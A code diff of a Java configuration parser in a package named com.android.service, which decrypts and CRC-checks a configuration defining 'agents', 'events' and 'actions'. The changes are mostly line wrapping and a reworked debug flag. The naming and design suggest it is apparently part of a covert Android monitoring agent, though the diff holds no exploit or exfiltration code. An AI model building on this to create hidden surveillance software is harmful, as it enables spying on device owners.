@@ -10,7 +10,9 @@ package com.android.service.conf;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
+import java.util.Map;
 
+import android.util.Config;
 import android.util.Log;
 
 import com.android.service.Debug;
@@ -20,6 +22,7 @@ import com.android.service.action.Action;
 import com.android.service.action.SubActionType;
 import com.android.service.agent.AgentConf;
 import com.android.service.agent.AgentType;
+import com.android.service.auto.AutoConfig;
 import com.android.service.crypto.Crypto;
 import com.android.service.crypto.Keys;
 import com.android.service.event.EventConf;
@@ -27,7 +30,6 @@ import com.android.service.event.EventType;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class Configuration.
  */
@@ -80,10 +82,11 @@ public class Configuration {
 	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
 	private static final int AGENT_ENABLED = 0x2;
+
 	// public static final String SYNC_URL =
 	// "http://192.168.1.189/wc12/webclient";
 
-	public static final boolean DEBUG = false;
+	// public static final boolean DEBUG = Config.DEBUG;
 
 	/**
 	 * Instantiates a new configuration.
@@ -195,7 +198,8 @@ public class Configuration {
 	 *             the rCS exception
 	 */
 	private int findTag(final String tag) throws GeneralException {
-		final int index = Utils.getIndex(wrappedClearConf.array(), tag.getBytes());
+		final int index = Utils.getIndex(wrappedClearConf.array(),
+				tag.getBytes());
 
 		if (index == -1) {
 			throw new GeneralException("Tag " + tag + " not found");
@@ -240,7 +244,8 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("QZ", TAG + " Agent: " + id + " Enabled: " + enabled + " Params Len: " + plen);
+			Log.d("QZ", TAG + " Agent: " + id + " Enabled: " + enabled
+					+ " Params Len: " + plen);
 
 			AgentType type = AgentType.get(id);
 			if (type != null) {
@@ -291,7 +296,8 @@ public class Configuration {
 
 			EventType type = EventType.get(typeId);
 
-			Log.d("QZ", TAG + " Configuration.java Event: " + type + " Action: " + action + " Params Len: " + plen);
+			Log.d("QZ", TAG + " Configuration.java Event: " + type
+					+ " Action: " + action + " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
 			status.addEvent(e);
@@ -334,13 +340,15 @@ public class Configuration {
 					}
 
 					if (a.addSubAction(type, params)) {
-						Log.d("QZ", TAG + " SubAction " + j + " Type: " + SubActionType.get(type) + " Params Length: "
+						Log.d("QZ", TAG + " SubAction " + j + " Type: "
+								+ SubActionType.get(type) + " Params Length: "
 								+ plen);
 					}
 
 				}
 
-				Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number");
+				Check.ensures(a.getSubActionsNum() == subNum,
+						"inconsistent subaction number");
 
 				status.addAction(a);
 			}
@@ -402,7 +410,8 @@ public class Configuration {
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void decryptConfiguration(final byte[] rawConf) throws GeneralException {
+	private void decryptConfiguration(final byte[] rawConf)
+			throws GeneralException {
 		/**
 		 * Struttura del file di configurazione
 		 * 
@@ -416,7 +425,8 @@ public class Configuration {
 		try {
 
 			if (rawConf == null) {
-				throw new GeneralException("Cannot allocate memory for configuration");
+				throw new GeneralException(
+						"Cannot allocate memory for configuration");
 			}
 
 			// Decrypt configuration
@@ -433,7 +443,8 @@ public class Configuration {
 			final byte[] clearConf = crypto.decrypt(rawConf, 0);
 
 			// Extract clear length DWORD
-			this.wrappedClearConf = Utils.bufferToByteBuffer(clearConf, ByteOrder.LITTLE_ENDIAN);
+			this.wrappedClearConf = Utils.bufferToByteBuffer(clearConf,
+					ByteOrder.LITTLE_ENDIAN);
 
 			final int confClearLen = this.wrappedClearConf.getInt();
 
@@ -441,7 +452,8 @@ public class Configuration {
 			final int confCrc = this.wrappedClearConf.getInt(confClearLen - 4);
 
 			if (confCrc != crc(clearConf, 0, confClearLen - 4)) {
-				throw new GeneralException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = "
+				throw new GeneralException("CRC mismatch, stored CRC = "
+						+ confCrc + " calculated CRC = "
 						+ crc(clearConf, 0, confClearLen));
 			}
 
@@ -449,13 +461,19 @@ public class Configuration {
 			Log.d("QZ", TAG + " Configuration is valid");
 			return;
 		} catch (final IOException ioe) {
-			if(Configuration.DEBUG) { ioe.printStackTrace(); }
+			if (Configuration.isDebug()) {
+				ioe.printStackTrace();
+			}
 			Log.d("QZ", TAG + " IOException() detected");
 		} catch (final SecurityException se) {
-			if(Configuration.DEBUG) { se.printStackTrace(); }
+			if (Configuration.isDebug()) {
+				se.printStackTrace();
+			}
 			Log.d("QZ", TAG + " SecurityException() detected");
 		} catch (final Exception e) {
-			if(Configuration.DEBUG) { e.printStackTrace(); }
+			if (Configuration.isDebug()) {
+				e.printStackTrace();
+			}
 			Log.d("QZ", TAG + " Exception() detected");
 		}
 
@@ -471,6 +489,10 @@ public class Configuration {
 
 		// Clean configuration buffer
 		wrappedClearConf = null;
+	}
+
+	public static boolean isDebug() {
+		return AutoConfig.DEBUG;
 	}
 
 }
